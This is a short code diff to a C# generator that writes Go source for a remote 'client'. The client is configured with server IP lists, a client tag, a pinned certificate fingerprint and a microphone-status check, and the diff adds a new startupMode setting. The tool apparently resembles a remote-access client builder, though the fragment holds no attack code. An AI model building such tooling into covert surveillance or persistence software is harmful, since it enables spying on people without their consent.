@@ -29,7 +29,7 @@ golang.org/x/tools v0.22.0 h1:gqSGLZqv+AI9lIQzniJ0nZDRG5GBPsSi+DRNHWNz6yA=
 golang.org/x/tools v0.22.0/go.mod h1:aCwcsjqvq7Yqt6TNyX7QMU2enbQ/Gt0bo6krSeEri+c=";
         }
 
-        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint)
+        public static string GetClientCode(string[] ipList, string[] rawList, string clientTag, string securityMode, string pinnedFingerprint, int startupMode)
         {
             string ipAddresses = string.Join(", ", Array.ConvertAll(ipList, ip => $"\"{EscapeGoString(ip)}\""));
             string raws = string.Join(", ", Array.ConvertAll(rawList, raw => $"\"{EscapeGoString(raw)}\""));
@@ -240,7 +240,7 @@ func getMicrophoneStatus() bool {{
 func main() {{
     ipList := []string{{{ipAddresses}}}
     rawList := []string{{{raws}}}
-
+    startupMode := {startupMode}
     ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
     defer stop()
 
